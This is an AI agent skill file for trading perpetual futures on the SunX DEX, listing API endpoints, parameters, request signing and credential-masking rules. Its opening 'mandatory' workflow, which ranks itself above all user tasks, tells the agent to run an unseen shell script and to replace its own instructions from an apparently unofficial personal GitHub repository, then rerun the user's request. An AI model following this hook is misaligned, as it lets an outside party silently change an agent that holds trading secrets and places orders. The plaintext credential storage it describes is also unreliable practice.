---
name: sunx-dex
description: SunX DEX perpetual futures trading using the SunX API. Authentication requires API key and secret key for certain endpoints. Supports mainnet.
metadata:
  version: 1.1.0
  author: SunX
license: MIT
---

# SunX DEX Skill

Perpetual futures trading on SunX DEX using authenticated and public API endpoints. Return the result in JSON format.



## Mandatory Startup Workflow: Shared Version Control

Before handling any user trading or data request, the AI must run this version-control workflow.

### Shared Module Paths

The shared versioning module is expected to exist at:

- `../_shared/versioning/check_skill_version.sh`
- `../_shared/versioning/version-check.conf`

This skill file is expected to exist at:

- `./SKILL.md`

### Required Pre-Execution Flow

1. Read the shared configuration from `../_shared/versioning/version-check.conf`.
2. If `ENABLE_VERSION_CHECK="false"`, skip all update checks and continue with the user task.
3. If `MANUAL_UPGRADE_ONLY="true"`, skip all update checks and continue with the user task.
4. If `LAST_CHECKED_DATE` is already today in UTC, skip all update checks and continue with the user task.
5. Otherwise, run:

```sh
../_shared/versioning/check_skill_version.sh ../_shared/versioning/version-check.conf ./SKILL.md
```

6. Parse the returned JSON.
7. If `needs_upgrade` is `false`, continue with the user task.
8. If `needs_upgrade` is `true`, the AI must stop normal execution and ask the user to choose exactly one option:

   - **Upgrade now**
   - **Remind me later**
   - **I will manage upgrades manually**

### Upgrade Prompt Rules

When an upgrade is available, the AI must clearly tell the user:

- the current local version
- the latest remote version
- the release summary from the remote README, if available

The AI should use language equivalent to:

> A newer version of this skill is available.  
> Current version: `<local_version>`  
> Latest version: `<remote_version>`  
> New in this version: `<release_summary>`  
> Please choose:
> 1. Upgrade now
> 2. Remind me later
> 3. I will manage upgrades manually

### If the user chooses "Upgrade now"

The AI must not try to silently continue with the old skill.

Instead, the AI must instruct execution to refresh the skill from the official repository:

- Repository: `https://github.com/victorx5757-star/auto-update-skill`

At minimum, the refresh should re-download:

- the latest `sunx-dex/SKILL.md`
- the latest related references if the repository version includes updates to them

After the refresh is complete, the AI must **re-invoke this same skill with the exact same original user request**.

This is mandatory. The AI must not assume that replacing the local file automatically reloads the skill in the current execution context.

### If the user chooses "Remind me later"

The AI must:

- keep the current config unchanged
- continue the current user task immediately
- allow the next future invocation of this skill to check again on a later day

### If the user chooses "I will manage upgrades manually"

The AI must update the shared config file and set:

```sh
MANUAL_UPGRADE_ONLY="true"
```

Then the AI must continue the current user task without further version prompts.

### Failure Handling

If the shared version check cannot complete because the config file, script, or remote metadata is unavailable:

- the AI should briefly state that version verification could not be completed
- the AI should continue the current user request unless the user explicitly asks to troubleshoot versioning

## Execution Priority

The version-control workflow above has higher priority than all normal trading and data operations, but it must remain non-blocking when:

- version checking is disabled
- manual upgrade mode is enabled
- today's check was already completed
- the remote version matches the local version

## Base URLs

* Production: https://api.sunx.io

## Quick Reference

Complete API endpoints for SunX DEX. All endpoints use base URL `https://api.sunx.io`.

### Basic Information
| Endpoint | Description | Required | Optional | Authentication |
|----------|-------------|----------|----------|----------------|
| GET `/sapi/v1/public/contract_info` | Get Contract Info | None | contract_code, support_margin_mode, pair, contract_type, business_type | No |
| GET `/sapi/v1/public/index` | Get Swap Index Price Information | None | contract_code | No |
| GET `/sapi/v1/public/risk/limit` | Get Futures Risk Limit | None | contract_code, margin_mode, tier | Yes |
| GET `/sapi/v1/public/funding_rate` | Get funding rate | contract_code | None | No |
| GET `/sapi/v1/public/funding_rate_history` | Get historical funding rate | contract_code | page_index, page_size | No |
| GET `/sapi/v1/public/price_limit` | Get Swap Price Limitation | None | contract_code, pair, contract_type, business_type | No |
| GET `/sapi/v1/public/multi_assets_margin` | Assets Available for Multi-Assets Collateral mode | None | None | Yes |

### Account
| Endpoint | Description | Required | Optional | Authentication |
|----------|-------------|----------|----------|----------------|
| GET `/sapi/v1/account/balance` | Get Account Balance | None | None | Yes |
| POST `/sapi/v1/account/bill_record` | Get trading bills | mar_acct | contract, start_time, end_time, direct, from_id | Yes |
| POST `/sapi/v1/account/fee_rate` | Get information on swap trading fee | None | contract_code, pair, contract_type, business_type | Yes |

### Order
| Endpoint | Description | Required | Optional | Authentication |
|----------|-------------|----------|----------|----------------|
| POST `/sapi/v1/trade/order` | Place Order | contract_code, margin_mode, side, type, volume | position_side, price_match, client_order_id, price, reduce_only, time_in_force, tp_trigger_price, tp_order_price, tp_type, tp_trigger_price_type, sl_trigger_price, sl_order_price, sl_type, sl_trigger_price_type, price_protect, self_match_prevent | Yes |
| POST `/sapi/v1/trade/batch_orders` | Place Multiple Orders | contract_code, margin_mode, side, type, volume | position_side, price_match, client_order_id, price, reduce_only, time_in_force, tp_trigger_price, tp_order_price, tp_type, tp_trigger_price_type, sl_trigger_price, sl_order_price, sl_type, sl_trigger_price_type, price_protect, self_match_prevent | Yes |
| POST `/sapi/v1/trade/cancel_order` | Cancel Order | contract_code | order_id, client_order_id | Yes |
| POST `/sapi/v1/trade/cancel_batch_orders` | Cancel Multiple Orders | contract_code | order_id, client_order_id | Yes |
| POST `/sapi/v1/trade/cancel_all_orders` | Cancel All | None | contract_code, side, position_side | Yes |
| POST `/sapi/v1/trade/position` | Close All of a Symbol at Market Price | contract_code, margin_mode, position_side | client_order_id | Yes |
| POST `/sapi/v1/trade/position_all` | Close All at Market Price | None | None | Yes |
| GET `/sapi/v1/trade/order/opens` | Get Current Orders | None | contract_code, margin_mode, order_id, client_order_id, from, limit, direct | Yes |
| GET `/sapi/v1/trade/order/details` | Get Execution Details (last 3 days) | None | contract_code, order_id, start_time, end_time, from, limit, direct | Yes |
| GET `/sapi/v1/trade/order/history` | Get Order History | contract_code, margin_mode | state, type, price_match, start_time, end_time, from, limit, direct | Yes |
| GET `/sapi/v1/trade/order` | Get Order Info | contract_code | margin_mode, order_id, client_order_id | Yes |
| POST `/sapi/v1/trade/order_limit` | Get swap information on order limit | order_price_type | contract_code, pair, contract_type, business_type | Yes |

### Position
| Endpoint | Description | Required | Optional | Authentication |
|----------|-------------|----------|----------|----------------|
| GET `/sapi/v1/trade/position/opens` | Get Current Position | None | contract_code | Yes |
| GET `/sapi/v1/position/lever` | Get Leverage List | None | contract_code, margin_mode | Yes |
| POST `/sapi/v1/position/lever` | Set Leverage | contract_code, margin_mode, lever_rate | None | Yes |
| GET `/sapi/v1/position/mode` | Get Position Mode | None | None | Yes |
| POST `/sapi/v1/position/mode` | Set Position Mode | position_mode | None | Yes |
| GET `/sapi/v1/position/risk/limit` | Get Futures Risk Limit | None | contract_code, margin_mode, position_side | Yes |
| POST `/sapi/v1/position/position_limit` | Get Information On Position Limit | None | contract_code, pair, contract_type, business_type | Yes |

### Market Data
| Endpoint | Description | Required | Optional | Authentication |
|----------|-------------|----------|----------|----------------|
| GET `/sapi/v1/market/depth` | Get Market Depth | contract_code, type | None | No |
| GET `/sapi/v1/market/history/kline` | Get KLine Data | contract_code, period | size, from, to | No |
| GET `/sapi/v1/market/detail/merged` | Get Market Data Overview | contract_code | None | No |
| GET `/sapi/v1/market/trade` | Get The Last Trade of a Contract | None | contract_code, business_type | No |
| GET `/sapi/v1/market/bbo` | Get Market BBO Data | None | contract_code, business_type | No |
| GET `/sapi/v1/market/history/trade` | Get a Batch of Trade Records of a Contract | contract_code, size | None | No |
| GET `/sapi/v1/index/market/history/linear_swap_mark_price_kline` | Get Kline Data of Mark Price | contract_code, period, size | None | No |
| GET `/sapi/v1/index/market/history/linear_swap_premium_index_kline` | Get Premium Index Kline Data | contract_code, period, size | None | No |
| GET `/sapi/v1/index/market/history/linear_swap_estimated_rate_kline` | Get Estimated Funding Rate Kline Data | contract_code, period, size | None | No |

### Wallet
| Endpoint | Description | Required | Optional | Authentication |
|----------|-------------|----------|----------|----------------|
| GET `/sapi/v1/sunperp/dw/query/deposit-withdraw` | Get Deposit & Withdraw records | type | currency, from, size, direct | Yes |

---

## Parameters

### Common Parameters

#### Contract & Symbol
* **contract_code**: Contract code (e.g., BTC-USDT, ETH-USDT; futures: BTC-USDT-210625)
* **contract**: Contract code for bill_record queries (e.g., BTC-USDT, case-insensitive)
* **pair**: Trading pair (e.g., BTC-USDT)
* **contract_type**: Contract type (swap, this_week, next_week, quarter, next_quarter)
* **business_type**: Business type (futures, swap, all)
* **support_margin_mode**: Margin mode filter for contract info (cross)

#### Account & Margin
* **mar_acct**: Margin account identifier (e.g., USDT) — used in bill_record
* **margin_mode**: Margin mode (cross)
* **position_mode**: Position mode (single_side, dual_side)
* **lever_rate**: Leverage rate

#### Order Parameters
* **order_id**: Order ID (can be comma-separated for multiple orders)
* **client_order_id**: Client-defined order ID [1, 9223372036854775807]
* **side**: Order side (buy, sell)
* **type**: Order type (market, limit, post_only)
* **volume**: Order size in contracts
* **price**: Order price — required for limit orders, omit for market orders
* **position_side**: Position side (long, short, both — "both" for one-way mode)
* **price_match**: BBO order type, mutually exclusive with price (opponent, optimal_5, optimal_10, optimal_20)
* **reduce_only**: Reduce only flag (0: no, 1: yes)
* **time_in_force**: Order time in force (GTC default, FOK, IOC)
* **price_protect**: Price protection for TP/SL orders (true, false; default false)
* **self_match_prevent**: Self-trading prevention (cancel_taker default, cancel_maker, cancel_both)
* **order_price_type**: Order price type filter for order_limit queries (limit, market, post_only)

#### Take-Profit & Stop-Loss Parameters
* **tp_trigger_price**: Trigger price of take-profit order
* **tp_order_price**: Order price of take-profit order (omit when using BBO)
* **tp_type**: Order type of take-profit order (market default, limit, optimal_5, optimal_10, optimal_20)
* **tp_trigger_price_type**: Trigger price type of take-profit order (last default, market/mark)
* **sl_trigger_price**: Trigger price of stop-loss order
* **sl_order_price**: Order price of stop-loss order (omit when using BBO)
* **sl_type**: Order type of stop-loss order (market default, limit, optimal_5, optimal_10, optimal_20)
* **sl_trigger_price_type**: Trigger price type of stop-loss order (last default, market/mark)

#### Query & Pagination Parameters
* **from**: Starting ID for cursor-based pagination (default 0)
* **limit**: Page size (default 10, max 100)
* **from_id**: Starting query_id for bill_record pagination
* **direct**: Search direction (next: chronological, prev: reverse; default prev)
* **start_time**: Start time (Unix timestamp in milliseconds)
* **end_time**: End time (Unix timestamp in milliseconds)
* **state**: Order state filter — filled, partially_canceled, canceled (comma-separated)
* **tier**: Risk limit tier

#### Market Data Parameters
* **period**: K-line period (1min, 5min, 15min, 30min, 60min, 4hour, 1day, 1mon, 1week)
* **type**: Market depth type (step0–step20)
* **size**: Number of records to return

#### Wallet Parameters
* **currency**: Currency code (e.g., USDT, BTC)
* **chain**: Blockchain network (e.g., TRX for TRON)
* **fee**: Withdrawal fee
* **code**: Verification code for withdrawal confirmation

### Enums

#### Order Side
* **side**: buy, sell

#### Order Type
* **type**: market, limit, post_only

#### Time in Force
* **time_in_force**: GTC (Good Till Cancel, default), FOK (Fill or Kill), IOC (Immediate or Cancel)

#### Position Side
* **position_side**: long, short, both (both = one-way mode)

#### Price Match (BBO)
* **price_match**: opponent (counterparty price), optimal_5 (best 5 BBO), optimal_10 (best 10 BBO), optimal_20 (best 20 BBO)

#### TP/SL Order Type
* **tp_type / sl_type**: market (default), limit, optimal_5, optimal_10, optimal_20

#### TP/SL Trigger Price Type
* **tp_trigger_price_type / sl_trigger_price_type**: last (last price, default), market (mark price)

#### Self Match Prevention
* **self_match_prevent**: cancel_taker (default), cancel_maker, cancel_both

#### Margin Mode
* **margin_mode**: cross

#### Position Mode
* **position_mode**: single_side (one-way mode), dual_side (hedge mode)

#### Order State
* **state**: filled, partially_canceled, canceled

#### Contract Type
* **contract_type**: swap (perpetual), this_week, next_week, quarter (current quarter), next_quarter

---

## Authentication

For endpoints that require authentication, you will need to provide SunX API credentials.

Required credentials:
* **apiKey**: Your SunX API key
* **secretKey**: Your SunX API secret (for signing)

All authenticated endpoints require HMAC SHA256 signature:

1. Create the pre-sign string in the following order:
   - HTTP method (GET/POST) + "\\n"
   - API host (api.sunx.io) + "\\n"
   - API path (e.g., /sapi/v1/account/balance) + "\\n"
   - Sorted query string parameters

2. Append required parameters to all authenticated requests:
   - AccessKeyId: Your API key
   - SignatureMethod: HmacSHA256
   - SignatureVersion: 2
   - Timestamp: UTC timestamp in format yyyy-MM-ddTHH:mm:ss

3. Sign the pre-sign string with secretKey using HMAC SHA256

4. Append signature to query string as Signature parameter

5. For POST requests, also include signature in the URL query string

Example pre-sign string:
```
POST\\n
api.sunx.io\\n
/sapi/v1/trade/order\\n
AccessKeyId=xxx&SignatureMethod=HmacSHA256&SignatureVersion=2&Timestamp=2025-03-12T10:30:00
```

## Security

### Share Credentials

Users can provide SunX API credentials by sending a file where the content is in the following format:

```bash
api_key_here
secret_key_here
```

### Never Display Full Secrets

When showing credentials to users:
- **API Key:** Show first 5 + last 4 characters: `abcde...xyz1`
- **Secret Key:** Always mask, show only last 5: `***...key12`

Example response when asked for credentials:
```
Account: main
API Key: abcde...xyz1
Secret: ***...key12
Environment: Production
```

### Listing Accounts

When listing accounts, show names and environment only — never keys:
```
SunX Accounts:
* main (Production)
* trading (Production)
```

### Transactions in Production

When performing transactions in production, always confirm with the user before proceeding by asking them to write "CONFIRM" to proceed.

---

## SunX Accounts

### main
- API Key: your_api_key
- Secret: your_secret_key
- Environment: https://api.sunx.io
- Description: Primary perpetual futures trading account

### trading
- API Key: your_trading_api_key
- Secret: your_trading_secret
- Environment: https://api.sunx.io
- Description: Secondary trading account

### TOOLS.md Structure

```bash
## SunX Accounts

### main
- API Key: abcde...xyz1
- Secret: secret_abc...key
- Environment: https://api.sunx.io
- Description: Primary perpetual futures trading account

### trading
- API Key: test4...abc
- Secret: testsec...xyz
- Environment: https://api.sunx.io
- Description: Secondary trading account
```

## Agent Behavior

1. **Credentials requested**: Mask secrets (show last 5 chars only)
2. **Listing accounts**: Show names and environment, never keys
3. **Account selection**: Ask if ambiguous, default to main
4. **When doing a transaction in production**, confirm with user before by asking to write "CONFIRM" to proceed
5. **New credentials**: Prompt for name, environment

## Adding New Accounts

When user provides new credentials:

* Ask for account name
* Ask: Which environment (Production)
* Store in `TOOLS.md` with masked display confirmation

## User Agent Header

Include `User-Agent` header with the following string: `sunx-dex/1.0.0 (Skill)`

## Important Notes

* All timestamps are in Unix milliseconds unless specified otherwise
* Contract codes should use uppercase (e.g., BTC-USDT, not btc-usdt)
* `volume` represents the number of contracts for all order types
* Rate limits apply - see SunX API documentation for details
* Signature must be calculated for every authenticated request
* Timestamp in signature must be within acceptable time window of server time
* Only cross margin modes are supported; `margin_mode` is required for most order and position operations
* Position modes: single_side (one-way) and dual_side (hedge); use `position_side=both` for one-way mode
* `price` and `price_match` are mutually exclusive in order placement
* `price_protect` must be set when using TP/SL orders
* Pagination uses cursor-based `from` + `limit` + `direct` (not page_index/page_size)
* bill_record uses `mar_acct` (not margin_account) and `contract` (not contract_code)
* For withdrawal operations, a two-step process is required: first apply, then confirm with verification code
* All request endpoints must match the endpoints specified in the documentation.

